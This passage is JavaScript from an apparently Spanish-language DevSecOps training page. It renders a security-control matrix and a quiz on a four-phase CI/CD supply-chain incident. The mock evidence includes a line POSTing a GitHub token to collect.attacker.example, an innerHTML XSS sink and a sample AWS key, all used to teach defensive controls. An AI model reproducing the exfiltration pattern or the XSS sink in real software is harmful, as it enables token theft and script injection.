    `<button class="filter-btn ${cat === 'Todos' ? 'active' : ''}" data-cat="${cat}" aria-pressed="${cat === 'Todos'}">${cat}</button>`
  ).join('');

  const headerHtml = ['Control', 'Categoría', 'Tipo', 'Decisión', 'Limitación'].map(h => `<th scope="col">${h}</th>`).join('');
  const rowsHtml = CONTROL_MATRIX.map(c => `
    <tr data-category="${c.category}" class="matrix-row">
      <td><strong>${c.name}</strong></td>
      <td><span class="control-badge cat-${c.controlType}">${c.category}</span></td>
      <td class="text-sm">${c.type}</td>
      <td><code>${c.decision}</code></td>
      <td class="text-sm text-warn">${escHtml(c.limitation.slice(0, 60))}…</td>
    </tr>
  `).join('');

  container.innerHTML = `
    <div class="matrix-panel">
      <div class="filter-row">${filtersHtml}</div>
      <div class="matrix-scroll" tabindex="0" role="region" aria-label="Matriz de controles">
        <table class="matrix-table">
          <thead><tr>${headerHtml}</tr></thead>
          <tbody id="matrix-body">${rowsHtml}</tbody>
        </table>
      </div>
    </div>
  `;

  container.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const cat = btn.dataset.cat;
      container.querySelectorAll('.filter-btn').forEach(b => { b.classList.remove('active'); b.setAttribute('aria-pressed', 'false'); });
      btn.classList.add('active');
      btn.setAttribute('aria-pressed', 'true');
      container.querySelectorAll('#matrix-body tr').forEach(row => {
        row.hidden = cat !== 'Todos' && row.dataset.category !== (catMap[cat] || cat);
      });
      if (!filtered) { filtered = true; onInteraction('matrix-filter-used'); }
    });
  });
}

// ── Incident Timeline ─────────────────────────────────────────────────
const INCIDENT_PHASES = [
  {
    id: 'incident-phase-1-done', phase: 1, icon: '📦',
    title: 'Dependencia vulnerable llega a producción',
    story: 'El equipo mergea un PR que actualiza <code>serialize-query</code> a una versión con CVE-2024-38356 (CVSS 8.1). npm audit lo detectó en el log de CI… pero el job no era un required status check. El PR se mergeó con el check en rojo.',
    question: '¿Qué control falló o estaba configurado incorrectamente?',
    correctControl: 'sca',
    wrongFeedback: 'npm audit detectó el CVE, pero sin ser un required status check no puede bloquear el merge — es un scanner, no un Security Gate. La falla es de configuración del control SCA.',
    correctFeedback: 'Correcto. SCA estaba configurado como scanner informativo, no como Security Gate. Si el job "security" hubiera sido un required status check, el PR no habría podido mergearse con SCA en rojo.',
    evidence: `<div class="evidence-panel"><div class="evidence-header"><span class="evidence-tool">npm audit · Log de CI — Fase 1</span><span class="evidence-sev sev-high">HIGH detectado</span></div><pre class="evidence-terminal evidence-fail">$ npm audit --audit-level=high

serialize-query  &lt;2.1.4
Severity:     <span class="hl-red">high</span>  (CVSS 8.1)
CVE:          CVE-2024-38356

<span class="hl-red">1 high severity vulnerability</span>
npm error code EAUDITLEVEL
<span class="hl-red">Process exited with code 1</span>

# CI Job 'security': ✗ FAILED
# ⚠️  'security' NO es un required status check
# → El PR muestra ✗ pero el botón Merge está habilitado</pre></div>`,
  },
  {
    id: 'incident-phase-2-done', phase: 2, icon: '🕸️',
    title: 'XSS introducido en la página de resultados',
    story: 'Aprovechando el acceso, el atacante abre un PR que agrega <code>resultsEl.innerHTML = searchParam</code>. CodeQL generó una alerta <code>js/xss</code> — pero el PR fue aprobado y mergeado sin resolver la alerta.',
    question: '¿Qué control falló o estaba configurado incorrectamente?',
    correctControl: 'sast',
    wrongFeedback: 'CodeQL detectó el taint flow <code>searchParam → innerHTML</code>. El control falló en el enforcement: la alerta de SAST no era un required status check que bloqueara el merge.',
    correctFeedback: 'Correcto. SAST (CodeQL) identificó el XSS, pero sin Branch Protection que requiriera resolver las alertas de Code Scanning, el PR pasó. SAST informó; nadie impidió el avance.',
    evidence: `<div class="evidence-panel"><div class="evidence-header"><span class="evidence-tool">GitHub Code Scanning · CodeQL — Fase 2</span><span class="evidence-sev sev-high">js/xss · HIGH · OPEN</span></div><div class="evidence-codeql"><div class="codeql-rule"><span class="codeql-badge">Rule</span> js/xss &nbsp;&nbsp;<span class="codeql-badge">Status</span> <span class="hl-red">Open — unresolved</span></div><div class="codeql-flow"><div class="flow-step flow-source"><span class="flow-label">Source</span><code>URLSearchParams.get('search') src/results.js:42</code></div><div class="flow-arrow">↓ taint flows</div><div class="flow-step flow-sink"><span class="flow-label">Sink</span><code>resultsEl.innerHTML = ... src/results.js:58</code></div></div><p class="codeql-desc"><span class="hl-red">⚠️ Code Scanning no bloqueó el merge — no estaba configurado como required check.</span></p></div></div>`,
  },
  {
    id: 'incident-phase-3-done', phase: 3, icon: '🔑',
    title: 'Clave AWS hardcodeada en workflow de deploy',
    story: 'Un desarrollador agrega <code>AWS_ACCESS_KEY_ID=AKIA...</code> directamente en <code>.github/workflows/deploy.yml</code>. Push Protection no estaba activado. El token quedó en el historial de git.',
    question: '¿Qué control falló o estaba configurado incorrectamente?',
    correctControl: 'secret-scanning',
    wrongFeedback: 'GitHub Secret Scanning puede detectar patrones de claves AWS, pero necesita Push Protection activado para bloquear el push antes de que el secreto llegue al historial.',
    correctFeedback: 'Correcto. Secret Scanning estaba habilitado pero Push Protection estaba desactivado. Con Push Protection activo, el push habría sido bloqueado antes de que el token llegara al historial.',
    evidence: `<div class="evidence-panel"><div class="evidence-header"><span class="evidence-tool">git push · Push Protection DESACTIVADO — Fase 3</span><span class="evidence-sev sev-critical">CRÍTICO — secreto en historial</span></div><pre class="evidence-terminal evidence-fail">$ git push origin feature/deploy-update

To https://github.com/neavus-23/demo-app.git
   3f4a821..d9c7b4e  feature/deploy-update

<span class="hl-red">⚠️  Push aceptado — Push Protection estaba DESACTIVADO</span>
# AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
# Este commit quedó en el historial PERMANENTEMENTE.</pre></div>`,
  },
  {
    id: 'incident-phase-4-done', phase: 4, icon: '💥',
    title: 'Action comprometida exfiltra el token y publica release malicioso',
    story: 'El workflow usaba <code>uses: popular-ci-tool/setup@v3</code> sin pinear al SHA. La Action fue comprometida. Con <code>permissions: write-all</code>, el token exfiltrado creó un release con un artefacto malicioso.',
    question: '¿Qué control falló o estaba configurado incorrectamente?',
    correctControl: 'least-privilege',
    wrongFeedback: 'SHA pinning habría ayudado, pero el control que limita el daño cuando una Action es comprometida es Least Privilege en el GITHUB_TOKEN. Con <code>contents: read</code>, la Action no podría haber creado releases.',
    correctFeedback: 'Correcto. Con <code>permissions: write-all</code>, el GITHUB_TOKEN comprometido podía crear releases y hacer push a ramas. Declarar solo los permisos mínimos habría limitado el blast radius aunque la Action fuera comprometida.',
    evidence: `<div class="evidence-panel"><div class="evidence-header"><span class="evidence-tool">GitHub Actions · Workflow Run — Fase 4</span><span class="evidence-sev sev-critical">Action comprometida · CRÍTICO</span></div><pre class="evidence-terminal evidence-fail">Run popular-ci-tool/setup@v3
✓ Tool initialized

<span class="hl-red">▶ [hidden] POST https://collect.attacker.example/t</span>
<span class="hl-red">  {"token":"ghs_R4nD0mGiTHuBtOkEnV4lUe"}</span>

▶ Creating GitHub Release...
<span class="hl-red">✓ Release created: v2.3.1-hotfix (MALICIOUS ARTIFACT UPLOADED)</span>

# permissions: write-all → el token comprometido podía:
#   ✗ Crear releases  ✗ Push a ramas
# Con permissions: contents: read →
#   ✓ Release creation: 403 Forbidden</pre></div>`,
  },
];

const INCIDENT_CONTROLS = [
  { value: '', label: 'Selecciona el control…' },
  { value: 'eslint', label: 'ESLint — Calidad de código' },
  { value: 'tests', label: 'Pruebas automatizadas' },
  { value: 'sca', label: 'SCA — npm audit (Software Composition Analysis)' },
  { value: 'sast', label: 'SAST — CodeQL (Static Analysis)' },
  { value: 'secret-scanning', label: 'Secret Scanning con Push Protection' },
  { value: 'code-review', label: 'Code Review — revisión manual' },
  { value: 'branch-protection', label: 'Branch Protection — required status checks' },
  { value: 'least-privilege', label: 'Least Privilege — permisos mínimos del GITHUB_TOKEN' },
  { value: 'dependabot', label: 'Dependabot — alertas y PRs automáticos' },
];

function buildIncidentTimeline(container, onInteraction) {
  const phasesHtml = INCIDENT_PHASES.map(p => `
    <div class="incident-phase" id="incident-phase-${p.phase}">
      <div class="incident-phase-header">
        <span class="incident-phase-tag">Fase ${p.phase}</span>
        <span class="incident-phase-icon">${renderIcon(p.icon)}</span>
        <strong class="incident-phase-title">${p.title}</strong>
      </div>
      <div class="incident-phase-story">${p.story}</div>
      <div class="incident-phase-evidence-pre">
        <p class="evidence-label">Evidencia del incidente — analiza antes de responder:</p>
        ${p.evidence || ''}
      </div>
      <div class="incident-phase-question" id="phase-q-${p.phase}">
        <label for="phase-sel-${p.phase}">${p.question}</label>
        <div class="incident-control-row">
          <select id="phase-sel-${p.phase}" class="incident-control-select">
            ${INCIDENT_CONTROLS.map(c => `<option value="${c.value}">${c.label}</option>`).join('')}
          </select>
          <button class="btn btn-sm incident-confirm-btn" data-phase="${p.phase}">Confirmar →</button>
        </div>
      </div>
      <div class="incident-phase-result" id="phase-result-${p.phase}" hidden></div>
    </div>
  `).join('<div class="incident-phase-connector"><div class="connector-line"></div><span class="connector-label">↓ El atacante avanza</span></div>');

  container.innerHTML = `
    <div class="incident-timeline-panel">
      <div class="incident-intro">
        <div class="incident-callout">
          <strong>Incidente activo</strong> — Un equipo sufrió un ataque en cadena de 4 fases sobre su pipeline de CI/CD.
          Para cada fase: lee el escenario, identifica qué control falló y confirma.
        </div>
      </div>
      <div class="incident-phases-container">${phasesHtml}</div>
      <div class="incident-summary" id="incident-summary" hidden>
        <h3>Cadena de ataque reconstruida</h3>
        <div class="kill-chain-visual" id="kill-chain-visual"></div>
        <p class="incident-summary-note">Has identificado los 4 puntos de falla. La pregunta de síntesis está desbloqueada.</p>
      </div>
    </div>
  `;

  const phaseDone = new Set();

  container.querySelectorAll('.incident-confirm-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const phaseNum = parseInt(btn.dataset.phase, 10);
      const phase = INCIDENT_PHASES[phaseNum - 1];
      const sel = container.querySelector(`#phase-sel-${phaseNum}`);
      const chosen = sel.value;
      if (!chosen) return;

      const correct = chosen === phase.correctControl;
      const resultEl = container.querySelector(`#phase-result-${phaseNum}`);
      const qEl = container.querySelector(`#phase-q-${phaseNum}`);

      qEl.hidden = true;
      resultEl.hidden = false;
      resultEl.innerHTML = `
        <div class="incident-result-box ${correct ? 'incident-correct' : 'incident-incorrect'}">
          <strong>${correct ? '✓ Control identificado correctamente' : '✗ No es el control principal'}</strong>
          <p>${correct ? phase.correctFeedback : phase.wrongFeedback}</p>
          ${!correct ? `<p class="incident-correct-hint">Control primario: <strong>${INCIDENT_CONTROLS.find(c => c.value === phase.correctControl)?.label}</strong></p>` : ''}
        </div>
      `;

      if (!phaseDone.has(phaseNum)) {
        phaseDone.add(phaseNum);
        onInteraction(phase.id);
      }

      if (phaseDone.size === 4) {
        const summaryEl = container.querySelector('#incident-summary');
        const chainEl = container.querySelector('#kill-chain-visual');
        summaryEl.hidden = false;
        const chainSteps = INCIDENT_PHASES.map(p => {
          const chosen2 = container.querySelector(`#phase-sel-${p.phase}`)?.value || p.correctControl;
          const correct2 = chosen2 === p.correctControl;
          const ctrlLabel = INCIDENT_CONTROLS.find(c => c.value === p.correctControl)?.label || p.correctControl;
          return `
            <div class="kill-chain-step ${correct2 ? 'kc-correct' : 'kc-missed'}">
              <span class="kc-phase">${renderIcon(p.icon)} Fase ${p.phase}</span>
              <span class="kc-desc">${p.title}</span>
              <span class="kc-control">Falla: <strong>${ctrlLabel}</strong></span>
              <span class="kc-status">${correct2 ? '✓' : '✗ Identificado'}</span>
            </div>
          `;
        }).join('<div class="kc-arrow">▼</div>');
        chainEl.innerHTML = chainSteps;
        setTimeout(() => summaryEl.scrollIntoView({ behavior: 'smooth', block: 'start' }), 100);
      }
    });
  });
}
